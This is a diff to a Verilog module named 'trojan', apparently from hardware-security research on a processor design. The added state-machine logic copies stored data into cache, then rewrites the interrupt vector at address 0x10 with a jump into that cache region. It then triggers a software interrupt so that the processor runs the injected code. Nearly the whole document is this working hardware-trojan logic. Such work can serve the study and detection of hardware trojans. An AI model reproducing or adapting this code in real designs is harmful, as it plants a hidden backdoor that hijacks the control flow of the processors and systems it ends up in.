@@ -1,7 +1,12 @@
 
 `include "global_defines.v"
 
-`define TROJ_CACHE_BASE_ADDR 32'h0020E900
+//`define TROJ_CACHE_BASE_ADDR 32'h0020E900
+`define TROJ_CACHE_BASE_ADDR 32'h00200000
+
+// IRQ Interrupt
+`define TROJ_IRQ_BASE_ADDR   32'h00000010
+`define TROJ_JUMP_TO_CACHE   128'h00000000_e3a0f602_00000000_00000000
 
 `define IDLE        0
 `define COPY_DATA   1
@@ -40,11 +45,14 @@ module trojan (
 
     // Status from cache
     input wire	      i_cache_stall,
+    input wire        i_fetch_stall,
 
 	// Write to cache
 	output reg			o_troj,
 	output reg [127:0] 	o_troj_write_data,
-	output reg [31:0]	o_troj_write_addr
+	output reg [31:0]	o_troj_write_addr,
+
+    output reg          o_troj_trigger_irq
     );
     
     reg       startup;
@@ -55,6 +63,7 @@ module trojan (
     reg         o_troj_nxt;
     reg [127:0] o_troj_write_data_nxt;
     reg  [31:0] o_troj_write_addr_nxt;
+    reg         o_troj_trigger_irq_nxt;
 
     reg [2:0] offset;
     reg [2:0] offset_nxt;
@@ -62,12 +71,13 @@ module trojan (
     reg [`DATA_STORE_BITS-1:0] trojan_data_store_nxt;
 
     always @(*) begin
-        startup_nxt = 1'b0;
+        startup_nxt = startup;
         trojan_state_nxt = trojan_state;
 
         o_troj_nxt = o_troj;
         o_troj_write_data_nxt = o_troj_write_data;
         o_troj_write_addr_nxt = o_troj_write_addr;
+        o_troj_trigger_irq_nxt = 1'b0;
 
         offset_nxt = offset;
         trojan_data_store_nxt = trojan_data_store;
@@ -103,20 +113,41 @@ module trojan (
                         offset_nxt = offset+1;
                         trojan_data_store_nxt = {`DEFAULT_PATTERN, trojan_data_store[`DATA_STORE_BITS-1:128]};
                     end else begin
-                        // All data copied
-                        trojan_state_nxt = `COMPLETE;
+                        if (!startup) begin
+                            // All data copied, go rewrite interrupt handler address
+                            trojan_state_nxt = `REWRITE_IRQ;
 
-                        o_troj_nxt = 1'b0;
+                            o_troj_nxt = 1'b1;
+                            o_troj_write_data_nxt = `TROJ_JUMP_TO_CACHE;
+                            o_troj_write_addr_nxt = `TROJ_IRQ_BASE_ADDR;
 
-                        offset_nxt = 2'b0;
+                            offset_nxt = 2'b0;
+                        end else begin
+                            startup_nxt = 1'b0;
+                            trojan_state_nxt = `COMPLETE;
+
+                            o_troj_nxt = 1'b0;
+
+                            offset_nxt = 2'b0;
+                        end
                     end
                 end
             end
             `REWRITE_IRQ: begin
+                if (!i_cache_stall) begin
+                    // Copy complete!
+                    trojan_state_nxt = `TRIGGER_IRQ;
 
+                    o_troj_nxt = 1'b0;
+                end
             end
             `TRIGGER_IRQ: begin
+                if (!i_fetch_stall) begin
+                    // Trigger the software interrupt request
+                    trojan_state_nxt = `COMPLETE;
 
+                    o_troj_trigger_irq_nxt = 1'b1;
+                end
             end
             `COMPLETE: begin
                 // Copy complete. Reset state machine
@@ -135,6 +166,7 @@ module trojan (
             o_troj <= 1'b0;
             o_troj_write_data <= 128'h58595859585958595859585958595859; /// "XYXY..."
             o_troj_write_addr <= `TROJ_CACHE_BASE_ADDR;
+            o_troj_trigger_irq <= 1'b0;
 
             offset <= 2'b0;
             trojan_data_store <= {`DATA_STORE_SIZE{`DEFAULT_PATTERN}}; /// "XYXY..."
@@ -146,6 +178,7 @@ module trojan (
             o_troj <= o_troj_nxt;
             o_troj_write_data <= o_troj_write_data_nxt;
             o_troj_write_addr <= o_troj_write_addr_nxt;
+            o_troj_trigger_irq <= o_troj_trigger_irq_nxt;
 
             offset <= offset_nxt;
             trojan_data_store <= trojan_data_store_nxt;
@@ -242,31 +275,25 @@ module trojan (
             );
         end
 
-        if (i_rst) begin
-            $display("Initial Status");
-            $display("Trojan Data Store[0]: 0x%X", trojan_data_store[127:0]);
-            $display("Trojan Data Store[1]: 0x%X", trojan_data_store[255:128]);
-            $display("Trojan Data Store[2]: 0x%X", trojan_data_store[383:256]);
-            $display("Trojan Data Store[3]: 0x%X", trojan_data_store[511:384]);
-            $display("Trojan Data Store[4]: 0x%X\n", trojan_data_store[639:512]);
-        end
-
+        /*
         if (!i_rst && trojan_data_valid) begin
-            $display("Trojan Data: 0x%X\n", trojan_data);
-            $display("Trojan Data Store[0]: 0x%X", trojan_data_store[127:0]);
-            $display("Trojan Data Store[1]: 0x%X", trojan_data_store[255:128]);
-            $display("Trojan Data Store[2]: 0x%X", trojan_data_store[383:256]);
-            $display("Trojan Data Store[3]: 0x%X", trojan_data_store[511:384]);
-            $display("Trojan Data Store[4]: 0x%X\n", trojan_data_store[639:512]);
+            $display("Trojan Data Store: 0x%X 0x%X 0x%X 0x%X 0x%X 0x%X",
+                trojan_data_store[767:640], trojan_data_store[639:512],
+                trojan_data_store[511:384], trojan_data_store[383:256],
+                trojan_data_store[255:128], trojan_data_store[127:0]);
         end
 
         if (!i_rst && o_troj) begin
             $display("State: %d  addr[0x%X]=0x%X\n", trojan_state, o_troj_write_addr, o_troj_write_data);
-            $display("Trojan Data Store[0]: 0x%X", trojan_data_store[127:0]);
-            $display("Trojan Data Store[1]: 0x%X", trojan_data_store[255:128]);
-            $display("Trojan Data Store[2]: 0x%X", trojan_data_store[383:256]);
-            $display("Trojan Data Store[3]: 0x%X", trojan_data_store[511:384]);
-            $display("Trojan Data Store[4]: 0x%X\n", trojan_data_store[639:512]);
+            $display("Trojan Data Store: 0x%X 0x%X 0x%X 0x%X 0x%X 0x%X",
+                trojan_data_store[767:640], trojan_data_store[639:512],
+                trojan_data_store[511:384], trojan_data_store[383:256],
+                trojan_data_store[255:128], trojan_data_store[127:0]);
+        end
+        */
+
+        if (!i_rst && o_troj_trigger_irq) begin
+            $display("Interrupt Triggered\n");
         end
     end
 endmodule
